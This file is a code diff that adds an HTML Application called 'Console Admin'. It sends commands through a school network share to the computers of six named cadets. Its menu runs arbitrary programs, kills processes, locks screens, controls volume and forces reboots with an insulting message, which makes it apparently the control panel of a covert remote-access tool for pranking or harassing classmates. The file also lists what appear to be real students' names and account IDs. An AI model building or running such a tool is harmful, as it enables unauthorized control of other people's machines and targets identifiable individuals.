@@ -1,0 +1,87 @@
+<html>
+<head><title>Console Admin</title>
+<link rel=StyleSheet href="xcss.css" type="text/css">
+<script src="gaia.js"></script>
+<style>
+body{
+  font-size: 11;
+  padding: 0;
+  margin: 0;
+  overflow: hidden;
+  font-family:arial,sans-serif;
+}
+</style>
+<script>
+XU.ResizeWindow(200,300,0,1);
+var idata   = 0;
+var server  = "\\\\cadet-fs\\cadet_data\\Cadet_Wing\\Group 2\\CS20\\";
+var App={
+	Ini:function(){
+		XU.CenterElement('mainspan','b');
+	},
+	Send:function(){
+		if (cmdin.value){
+			XS.File(server+'cmd','create',namein.value+'::'+cmdin.value);
+		}
+	},
+	Ck:function(){
+		alert(XS.File(server+'usr','open'));
+	}
+	
+};
+</script>
+</head>
+<body onload="App.Ini()">
+<HTA:APPLICATION ID="consoleadmin"
+    APPLICATIONNAME="consoleadmin"
+    BORDER="normal"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    ICON="ico.ico"
+    SCROLL="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="yes"
+    INNERBORDER="no"
+    CONTEXTMENU="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="normal"
+    SYSMENU="yes"
+    SHOWINTASKBAR="yes"
+    SCROLLFLAT="yes"
+    NAVIGABLE="no"
+    SELECTION="no">
+<span id="mainspan" style="position:absolute;top:0;left:0;">
+<select id="namein">
+<option selected></option>
+<option value="c14judah.hooper">Judah Hooper</option>
+<option value="c14mathieu.lefebvre">Mathieu Lefevbre</option>
+<option value="c14harrison.hatcher">Harrison Hatcher</option>
+<option value="c14gavin.delphia">Gavin Delphia</option>
+<option value="c14alexander.kim">Alexander Kim</option>
+<option value="c14brandon.ostert">Brandon Ostert</option>
+</select> <input type="button" value="Users" onclick="App.Ck()">
+<textarea id="cmdin"></textarea> 
+</select><br>
+<select onchange="cmdin.value=this.value;">
+<option value="" selected></option>
+<option value="msg::">Message</option>
+<option value='msg::<img src="">'>Image</option>
+<option value="cmd::nircmdc.exe exec show ">Execute</option>
+<option value="cmd::nircmdc.exe monitor off">Monitor Off</option>
+<option value="cmd::nircmdc.exe screensaver">Screen Saver</option>
+<option value="cmd::nircmdc.exe lockws">Lock Computer</option>
+<option value="cmd::nircmdc.exe cdrom open">CD ROM Open</option>
+<option value="cmd::nircmdc.exe killprocess ">Kill Process</option>
+<option value="cmd::nircmdc.exe setsysvolume 65535">Volume Max</option>
+<option value="cmd::nircmdc.exe setsysvolume 0">Volume Min</option>
+<option value="cmd::nircmdc.exe mutesysvolume 1">Mute</option>
+<option value="cmd::nircmdc.exe mutesysvolume 0">Unmute</option>
+<option value="exit">Exit</option>
+<option value='speak::'>Speak</option>
+<option value='cmd::shutdown.exe -a'>Abort Reboot</option>
+<option value='cmd::nircmdc.exe initshutdown "because you suck" 60 reboot'>Reboot</option>
+<option value='reset'>Reset App</option>
+</select> <input type="button" value="Send" onclick="App.Send()">
+</span>
+</body>
+</html>
